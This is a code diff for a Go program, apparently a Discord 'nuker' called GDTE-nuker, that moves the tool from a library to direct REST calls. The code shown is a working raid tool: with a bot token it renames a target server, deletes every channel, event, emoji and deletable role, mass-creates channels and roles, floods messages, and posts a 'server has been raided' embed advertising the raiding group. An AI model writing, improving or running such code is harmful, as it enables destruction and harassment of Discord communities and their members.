@@ -14,8 +14,6 @@ import (
 	"strings"
 	"sync"
 	"time"
-
-	"github.com/bwmarrin/discordgo"
 )
 
 const (
@@ -23,6 +21,7 @@ const (
 	CLEAR_SCREEN = "\033[2J\033[H"
 	HIDE_CURSOR  = "\033[?25l"
 	SHOW_CURSOR  = "\033[?25h"
+	API_BASE     = "https://discord.com/api/v9"
 )
 
 var GRADIENT = []int{196, 202, 208, 214, 220, 226, 190, 154, 118, 82, 46, 47, 48, 49, 50, 51, 45, 39, 33, 27, 21, 57, 93, 129, 165, 201, 200, 199, 198, 197}
@@ -193,97 +192,114 @@ func generateChannelName(baseNames []string) string {
 	return base + sb.String()
 }
 
-func apiRequest(method, url, token string, body []byte) (*http.Response, error) {
+type DiscordClient struct {
+	token      string
+	httpClient *http.Client
+}
+
+func NewDiscordClient(token string) *DiscordClient {
+	return &DiscordClient{
+		token:      token,
+		httpClient: &http.Client{Timeout: 30 * time.Second},
+	}
+}
+
+func (c *DiscordClient) request(method, endpoint string, body []byte) (*http.Response, error) {
 	var bodyReader io.Reader
 	if body != nil {
 		bodyReader = bytes.NewReader(body)
 	}
-	req, err := http.NewRequest(method, url, bodyReader)
+	req, err := http.NewRequest(method, API_BASE+endpoint, bodyReader)
 	if err != nil {
 		return nil, err
 	}
-	req.Header.Set("Authorization", "Bot "+token)
+	req.Header.Set("Authorization", "Bot "+c.token)
 	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("User-Agent", "Mozilla/5.0")
-	client := &http.Client{Timeout: 30 * time.Second}
-	return client.Do(req)
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+	return c.httpClient.Do(req)
 }
 
-func createChannelAPI(guildID, name, token string) (string, error) {
-	payload := map[string]interface{}{
-		"name": name,
-		"type": 0,
-	}
-	body, _ := json.Marshal(payload)
-	resp, err := apiRequest("POST", "https://discord.com/api/v9/guilds/"+guildID+"/channels", token, body)
+func (c *DiscordClient) getJSON(endpoint string) (map[string]interface{}, error) {
+	resp, err := c.request("GET", endpoint, nil)
 	if err != nil {
-		return "", err
+		return nil, err
 	}
 	defer resp.Body.Close()
-
-	respBody, _ := io.ReadAll(resp.Body)
-
-	if resp.StatusCode != 200 && resp.StatusCode != 201 {
-		return "", fmt.Errorf("status %d: %s", resp.StatusCode, string(respBody))
+	body, _ := io.ReadAll(resp.Body)
+	if resp.StatusCode != 200 {
+		return nil, fmt.Errorf("status %d: %s", resp.StatusCode, string(body))
 	}
-
 	var result map[string]interface{}
-	if err := json.Unmarshal(respBody, &result); err != nil {
-		return "", err
+	if err := json.Unmarshal(body, &result); err != nil {
+		return nil, err
 	}
-
-	id, ok := result["id"].(string)
-	if !ok {
-		return "", fmt.Errorf("no id in response")
-	}
-	return id, nil
+	return result, nil
 }
 
-func sendMessageAPI(channelID, content, token string) error {
-	payload := map[string]interface{}{
-		"content": content,
+func (c *DiscordClient) getJSONArray(endpoint string) ([]map[string]interface{}, error) {
+	resp, err := c.request("GET", endpoint, nil)
+	if err != nil {
+		return nil, err
 	}
-	body, _ := json.Marshal(payload)
-	resp, err := apiRequest("POST", "https://discord.com/api/v9/channels/"+channelID+"/messages", token, body)
+	defer resp.Body.Close()
+	body, _ := io.ReadAll(resp.Body)
+	if resp.StatusCode != 200 {
+		return nil, fmt.Errorf("status %d: %s", resp.StatusCode, string(body))
+	}
+	var result []map[string]interface{}
+	if err := json.Unmarshal(body, &result); err != nil {
+		return nil, err
+	}
+	return result, nil
+}
+
+func (c *DiscordClient) delete(endpoint string) error {
+	resp, err := c.request("DELETE", endpoint, nil)
 	if err != nil {
 		return err
 	}
 	defer resp.Body.Close()
+	body, _ := io.ReadAll(resp.Body)
 	if resp.StatusCode != 200 && resp.StatusCode != 204 {
-		respBody, _ := io.ReadAll(resp.Body)
-		return fmt.Errorf("status %d: %s", resp.StatusCode, string(respBody))
+		return fmt.Errorf("status %d: %s", resp.StatusCode, string(body))
 	}
 	return nil
 }
 
-func sendEmbedAPI(channelID, token string) error {
-	payload := map[string]interface{}{
-		"embeds": []map[string]interface{}{
-			{
-				"title":       "GDTEnuker",
-				"description": "This server has been raided by **GDTE**!\n\nWe are unstoppable.\nJoin: https://discord.gg/TbkZR5fhUs",
-				"color":       0x242929,
-				"thumbnail": map[string]string{
-					"url": "https://cdn.discordapp.com/attachments/1514638682664210705/1515732847493906482/Screenshot_2026-06-14_235923.png",
-				},
-				"footer": map[string]string{
-					"text": "@everyone https://github.com/agehantonu/GDTE-nuker",
-				},
-				"timestamp": time.Now().Format(time.RFC3339),
-			},
-		},
-	}
+func (c *DiscordClient) postJSON(endpoint string, payload map[string]interface{}) (map[string]interface{}, error) {
 	body, _ := json.Marshal(payload)
-	resp, err := apiRequest("POST", "https://discord.com/api/v9/channels/"+channelID+"/messages", token, body)
+	resp, err := c.request("POST", endpoint, body)
 	if err != nil {
-		return err
+		return nil, err
 	}
 	defer resp.Body.Close()
-	if resp.StatusCode != 200 && resp.StatusCode != 204 {
-		respBody, _ := io.ReadAll(resp.Body)
-		return fmt.Errorf("status %d: %s", resp.StatusCode, string(respBody))
+	respBody, _ := io.ReadAll(resp.Body)
+	if resp.StatusCode != 200 && resp.StatusCode != 201 && resp.StatusCode != 204 {
+		return nil, fmt.Errorf("status %d: %s", resp.StatusCode, string(respBody))
 	}
-	return nil
+	var result map[string]interface{}
+	if len(respBody) > 0 {
+		json.Unmarshal(respBody, &result)
+	}
+	return result, nil
+}
+
+func (c *DiscordClient) patchJSON(endpoint string, payload map[string]interface{}) (map[string]interface{}, error) {
+	body, _ := json.Marshal(payload)
+	resp, err := c.request("PATCH", endpoint, body)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+	respBody, _ := io.ReadAll(resp.Body)
+	if resp.StatusCode != 200 && resp.StatusCode != 201 {
+		return nil, fmt.Errorf("status %d: %s", resp.StatusCode, string(respBody))
+	}
+	var result map[string]interface{}
+	if len(respBody) > 0 {
+		json.Unmarshal(respBody, &result)
+	}
+	return result, nil
 }
 
 func main() {
@@ -357,33 +373,24 @@ func main() {
 
 	logQuestion("Press ENTER to start nuke...")
 
-	dg, err := discordgo.New("Bot " + token)
+	client := NewDiscordClient(token)
+
+	me, err := client.getJSON("/users/@me")
 	if err != nil {
-		logInfo(fmt.Sprintf("[-] Error creating session: %v", err))
+		logInfo(fmt.Sprintf("[-] Authentication failed: %v", err))
 		showCursor()
 		return
 	}
+	username, _ := me["username"].(string)
+	logInfo(fmt.Sprintf("[+] %s is connected!", username))
 
-	dg.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMessages | discordgo.IntentsMessageContent
-
-	dg.AddHandler(func(s *discordgo.Session, r *discordgo.Ready) {
-		logInfo(fmt.Sprintf("[+] %s is connected!", r.User.Username))
-		go nukeGuild(s, token, guildID, serverName, iconURL, roleName, roleCount, roleColor, channelCount, messagesPerChannel, channelNames, messageContent)
-	})
-
-	err = dg.Open()
-	if err != nil {
-		logInfo(fmt.Sprintf("[-] Error opening connection: %v", err))
-		showCursor()
-		return
-	}
-	defer dg.Close()
+	go nukeGuild(client, guildID, serverName, iconURL, roleName, roleCount, roleColor, channelCount, messagesPerChannel, channelNames, messageContent)
 
 	logInfo("[i] Bot is running. Press Ctrl+C to exit.")
 	select {}
 }
 
-func nukeGuild(s *discordgo.Session, token, guildID, serverName, iconURL, roleName string, roleCount, roleColor, channelCount, messagesPerChannel int, channelNames []string, messageContent string) {
+func nukeGuild(client *DiscordClient, guildID, serverName, iconURL, roleName string, roleCount, roleColor, channelCount, messagesPerChannel int, channelNames []string, messageContent string) {
 	startTime := time.Now()
 	fmt.Println()
 	logInfo("NUKE STARTED")
@@ -391,11 +398,11 @@ func nukeGuild(s *discordgo.Session, token, guildID, serverName, iconURL, roleNa
 
 	go func() {
 		iconBase64 := downloadToBase64(iconURL)
-		g := &discordgo.GuildParams{Name: serverName}
+		payload := map[string]interface{}{"name": serverName}
 		if iconBase64 != "" {
-			g.Icon = iconBase64
+			payload["icon"] = iconBase64
 		}
-		_, err := s.GuildEdit(guildID, g)
+		_, err := client.patchJSON("/guilds/"+guildID, payload)
 		if err != nil {
 			logFAIL("server edit", err.Error())
 		} else {
@@ -403,43 +410,64 @@ func nukeGuild(s *discordgo.Session, token, guildID, serverName, iconURL, roleNa
 		}
 	}()
 
-	channels, _ := s.GuildChannels(guildID)
-	var chWg sync.WaitGroup
-	for _, ch := range channels {
-		chWg.Add(1)
-		go func(cID, cName string) {
-			defer chWg.Done()
-			_, err := s.ChannelDelete(cID)
-			if err != nil {
-				logFAIL("channel delete", cName)
-			} else {
-				logOK("channel delete", cName)
+	channels, err := client.getJSONArray("/guilds/" + guildID + "/channels")
+	if err != nil {
+		logFAIL("get channels", err.Error())
+	} else {
+		var chWg sync.WaitGroup
+		for _, ch := range channels {
+			chID, _ := ch["id"].(string)
+			chName, _ := ch["name"].(string)
+			if chID == "" {
+				continue
 			}
-		}(ch.ID, ch.Name)
+			chWg.Add(1)
+			go func(id, name string) {
+				defer chWg.Done()
+				err := client.delete("/channels/" + id)
+				if err != nil {
+					logFAIL("channel delete", name)
+				} else {
+					logOK("channel delete", name)
+				}
+			}(chID, chName)
+		}
+		chWg.Wait()
 	}
-	chWg.Wait()
 
-	events, _ := s.GuildScheduledEvents(guildID, false)
-	var evWg sync.WaitGroup
-	for _, ev := range events {
-		evWg.Add(1)
-		go func(eID string) {
-			defer evWg.Done()
-			_ = s.GuildScheduledEventDelete(guildID, eID)
-		}(ev.ID)
+	events, err := client.getJSONArray("/guilds/" + guildID + "/scheduled-events")
+	if err == nil {
+		var evWg sync.WaitGroup
+		for _, ev := range events {
+			eID, _ := ev["id"].(string)
+			if eID == "" {
+				continue
+			}
+			evWg.Add(1)
+			go func(id string) {
+				defer evWg.Done()
+				_ = client.delete("/guilds/" + guildID + "/scheduled-events/" + id)
+			}(eID)
+		}
+		evWg.Wait()
 	}
-	evWg.Wait()
 
-	emojis, _ := s.GuildEmojis(guildID)
-	var emojiWg sync.WaitGroup
-	for _, em := range emojis {
-		emojiWg.Add(1)
-		go func(eID string) {
-			defer emojiWg.Done()
-			_ = s.GuildEmojiDelete(guildID, eID)
-		}(em.ID)
+	emojis, err := client.getJSONArray("/guilds/" + guildID + "/emojis")
+	if err == nil {
+		var emojiWg sync.WaitGroup
+		for _, em := range emojis {
+			eID, _ := em["id"].(string)
+			if eID == "" {
+				continue
+			}
+			emojiWg.Add(1)
+			go func(id string) {
+				defer emojiWg.Done()
+				_ = client.delete("/guilds/" + guildID + "/emojis/" + id)
+			}(eID)
+		}
+		emojiWg.Wait()
 	}
-	emojiWg.Wait()
 
 	createdChannelIDs := make([]string, 0, channelCount)
 	if channelCount > 0 {
@@ -456,14 +484,20 @@ func nukeGuild(s *discordgo.Session, token, guildID, serverName, iconURL, roleNa
 			chCreateWg.Add(1)
 			go func(idx int, n string) {
 				defer chCreateWg.Done()
-				chID, err := createChannelAPI(guildID, n, token)
-				if err == nil {
-					chMu.Lock()
-					createdChannelIDs = append(createdChannelIDs, chID)
-					chMu.Unlock()
-					logOK("channel make", n)
-				} else {
+				result, err := client.postJSON("/guilds/"+guildID+"/channels", map[string]interface{}{
+					"name": n,
+					"type": 0,
+				})
+				if err != nil {
 					logFAIL("channel make", err.Error())
+				} else {
+					chID, _ := result["id"].(string)
+					if chID != "" {
+						chMu.Lock()
+						createdChannelIDs = append(createdChannelIDs, chID)
+						chMu.Unlock()
+					}
+					logOK("channel make", n)
 				}
 			}(i, name)
 		}
@@ -482,9 +516,11 @@ func nukeGuild(s *discordgo.Session, token, guildID, serverName, iconURL, roleNa
 		for _, chID := range createdChannelIDs {
 			for i := 0; i < messagesPerChannel; i++ {
 				msgWg.Add(1)
-				go func(cID string) {
+				go func(id string) {
 					defer msgWg.Done()
-					err := sendMessageAPI(cID, messageContent, token)
+					_, err := client.postJSON("/channels/"+id+"/messages", map[string]interface{}{
+						"content": messageContent,
+					})
 					if err != nil {
 						msgMu.Lock()
 						msgErr++
@@ -494,7 +530,7 @@ func nukeGuild(s *discordgo.Session, token, guildID, serverName, iconURL, roleNa
 						msgMu.Lock()
 						msgSuccess++
 						msgMu.Unlock()
-						logOK("message ok", cID)
+						logOK("message ok", id)
 					}
 				}(chID)
 			}
@@ -504,17 +540,36 @@ func nukeGuild(s *discordgo.Session, token, guildID, serverName, iconURL, roleNa
 	}
 
 	logInfo("[i] Sending embed to rules channel...")
-	channels, _ = s.GuildChannels(guildID)
+	channels, err = client.getJSONArray("/guilds/" + guildID + "/channels")
 	var rulesChID string
-	for _, ch := range channels {
-		if strings.Contains(strings.ToLower(ch.Name), "rules") || strings.Contains(strings.ToLower(ch.Name), "rule") {
-			rulesChID = ch.ID
-			break
+	if err == nil {
+		for _, ch := range channels {
+			chName, _ := ch["name"].(string)
+			chID, _ := ch["id"].(string)
+			if strings.Contains(strings.ToLower(chName), "rules") || strings.Contains(strings.ToLower(chName), "rule") {
+				rulesChID = chID
+				break
+			}
 		}
 	}
 
 	if rulesChID != "" {
-		err := sendEmbedAPI(rulesChID, token)
+		_, err := client.postJSON("/channels/"+rulesChID+"/messages", map[string]interface{}{
+			"embeds": []map[string]interface{}{
+				{
+					"title":       "GDTEnuker",
+					"description": "This server has been raided by **GDTE**!\n\nWe are unstoppable.\nJoin: https://discord.gg/TbkZR5fhUs",
+					"color":       0x242929,
+					"thumbnail": map[string]string{
+						"url": "https://cdn.discordapp.com/attachments/1514638682664210705/1515732847493906482/Screenshot_2026-06-14_235923.png",
+					},
+					"footer": map[string]string{
+						"text": "@everyone https://github.com/agehantonu/GDTE-nuker",
+					},
+					"timestamp": time.Now().Format(time.RFC3339),
+				},
+			},
+		})
 		if err != nil {
 			logFAIL("embed send", err.Error())
 		} else {
@@ -524,38 +579,45 @@ func nukeGuild(s *discordgo.Session, token, guildID, serverName, iconURL, roleNa
 		logFAIL("embed send", "no rules channel found")
 	}
 
-	roles, _ := s.GuildRoles(guildID)
-	var roleDelWg sync.WaitGroup
-	for _, role := range roles {
-		if role.ID == guildID || role.Managed {
-			continue
-		}
-		roleDelWg.Add(1)
-		go func(rID, rName string) {
-			defer roleDelWg.Done()
-			err := s.GuildRoleDelete(guildID, rID)
-			if err != nil {
-				logFAIL("role delete", rName)
-			} else {
-				logOK("role delete", rName)
+	roles, err := client.getJSONArray("/guilds/" + guildID + "/roles")
+	if err == nil {
+		var roleDelWg sync.WaitGroup
+		for _, role := range roles {
+			rID, _ := role["id"].(string)
+			rName, _ := role["name"].(string)
+			if rID == "" || rID == guildID {
+				continue
 			}
-		}(role.ID, role.Name)
+			managed, _ := role["managed"].(bool)
+			if managed {
+				continue
+			}
+			roleDelWg.Add(1)
+			go func(id, name string) {
+				defer roleDelWg.Done()
+				err := client.delete("/guilds/" + guildID + "/roles/" + id)
+				if err != nil {
+					logFAIL("role delete", name)
+				} else {
+					logOK("role delete", name)
+				}
+			}(rID, rName)
+		}
+		roleDelWg.Wait()
 	}
-	roleDelWg.Wait()
 
 	if roleCount > 0 {
 		logInfo(fmt.Sprintf("[i] Creating %d roles...", roleCount))
-		roleColorVal := roleColor
 		var roleCreateWg sync.WaitGroup
 		for i := 0; i < roleCount; i++ {
 			roleCreateWg.Add(1)
 			go func(idx int) {
 				defer roleCreateWg.Done()
-				_, err := s.GuildRoleCreate(guildID, &discordgo.RoleParams{
-					Name:        roleName,
-					Color:       &roleColorVal,
-					Hoist:       boolPtr(true),
-					Mentionable: boolPtr(true),
+				_, err := client.postJSON("/guilds/"+guildID+"/roles", map[string]interface{}{
+					"name":        roleName,
+					"color":       roleColor,
+					"hoist":       true,
+					"mentionable": true,
 				})
 				if err != nil {
 					logFAIL("role make", err.Error())
@@ -571,8 +633,4 @@ func nukeGuild(s *discordgo.Session, token, guildID, serverName, iconURL, roleNa
 	logInfo("NUKE COMPLETE")
 	logInfo(fmt.Sprintf("[+] Total execution time: %v", time.Since(startTime)))
 	fmt.Println()
-}
-
-func boolPtr(b bool) *bool {
-	return &b
 }
